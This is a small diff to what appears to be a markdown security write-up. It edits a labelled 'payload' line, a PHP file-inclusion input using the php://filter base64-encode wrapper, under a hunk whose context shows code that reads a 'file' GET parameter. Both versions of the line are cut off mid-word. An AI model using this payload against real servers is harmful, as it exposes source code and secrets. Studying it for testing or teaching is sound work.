@@ -6439,6 +6439,6 @@ if(isset($_GET['file'])){
 **payload:**
 
 ~~~
-?file=php://filter/read=convert.base64-encode/re
+?file=php://filter/read=convert.base64-encode/reso
 ~~~
 
